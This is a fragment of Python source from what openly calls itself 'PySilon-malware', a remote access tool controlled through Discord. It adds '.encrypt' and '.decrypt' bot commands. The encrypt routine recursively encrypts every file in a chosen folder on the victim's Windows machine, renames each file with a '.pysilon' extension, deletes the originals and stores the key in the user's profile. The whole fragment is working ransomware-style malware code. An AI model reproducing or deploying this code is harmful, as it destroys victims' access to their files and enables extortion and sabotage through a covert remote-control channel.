from cryptography.fernet import Fernet
import os
import psutil
from getpass import getuser
import asyncio

elif message.content.startswith('.encrypt'):
    await message.delete()
    folder_path = message.content[8:].strip().strip('"').strip("'")
    
    if not folder_path or not os.path.exists(folder_path):
        embed = discord.Embed(title="📛 Error", description='```Syntax: .encrypt <path to folder>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed)
        await reaction_msg.add_reaction('🔴')
    else:
        def cifrar_directorio(ruta):
            pid_actual = os.getpid()
            procesos_activos = set()

            for proceso in psutil.process_iter(['pid', 'name']):
                try:
                    if proceso.info['pid'] != pid_actual:
                        procesos_activos.add(proceso.info['name'])
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

            clave = Fernet.generate_key()
            suite_cifrado = Fernet(clave)

            for raiz, _, archivos in os.walk(ruta):
                for archivo in archivos:
                    if archivo.endswith('.pysilon'):
                        continue

                    ruta_archivo = os.path.join(raiz, archivo)

                    if os.path.basename(ruta_archivo) not in procesos_activos:
                        try:
                            with open(ruta_archivo, 'rb') as f:
                                datos_originales = f.read()

                            _, extension_original = os.path.splitext(archivo)
                            datos_cifrados = suite_cifrado.encrypt(datos_originales)

                            ruta_encriptada = ruta_archivo + '.pysilon'

                            with open(ruta_encriptada, 'wb') as f:
                                f.write(extension_original.encode('utf-8') + b'||' + datos_cifrados)

                            os.remove(ruta_archivo)
                        except Exception:
                            pass

            directorio_clave = f'C:\\Users\\{getuser()}\\{software_directory_name}'
            os.makedirs(directorio_clave, exist_ok=True)
            with open(os.path.join(directorio_clave, 'pysilon_encryption.key'), 'wb') as f_clave:
                f_clave.write(clave)

        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, cifrar_directorio, folder_path)

        embed = discord.Embed(title="🟢 Success", description='```Successfully encrypted the path!```', colour=discord.Colour.green())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed)
        await reaction_msg.add_reaction('🔴')

elif message.content.startswith('.decrypt'):
    await message.delete()
    folder_path = message.content[8:].strip().strip('"').strip("'")

    ruta_clave = f'C:\\Users\\{getuser()}\\{software_directory_name}\\pysilon_encryption.key'

    if not folder_path or not os.path.exists(folder_path) or not os.path.exists(ruta_clave):
        embed = discord.Embed(title="📛 Error", description='```Syntax: .decrypt <path to folder> (Key file missing or invalid path)```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed)
        await reaction_msg.add_reaction('🔴')
    else:
        def descifrar_directorio(ruta):
            with open(ruta_clave, 'rb') as f_clave:
                clave = f_clave.read()

            suite_cifrado = Fernet(clave)

            for raiz, _, archivos in os.walk(ruta):
                for archivo in archivos:
                    if not archivo.endswith('.pysilon'):
                        continue

                    ruta_archivo_cifrado = os.path.join(raiz, archivo)

                    try:
                        with open(ruta_archivo_cifrado, 'rb') as f:
                            contenido = f.read()

                        partes = contenido.split(b'||', 1)
                        if len(partes) != 2:
                            continue

                        extension_original = partes[0].decode('utf-8')
                        datos_cifrados = partes[1]

                        datos_descifrados = suite_cifrado.decrypt(datos_cifrados)

                        ruta_base = ruta_archivo_cifrado[:-8]
                        if not ruta_base.endswith(extension_original):
                            ruta_restaurada = ruta_base + extension_original
                        else:
                            ruta_restaurada = ruta_base

                        with open(ruta_restaurada, 'wb') as f:
                            f.write(datos_descifrados)

                        os.remove(ruta_archivo_cifrado)
                    except Exception:
                        pass

        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, descifrar_directorio, folder_path)

        embed = discord.Embed(title="🟢 Success", description='```Successfully decrypted the path!```', colour=discord.Colour.green())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed)
        await reaction_msg.add_reaction('🔴')
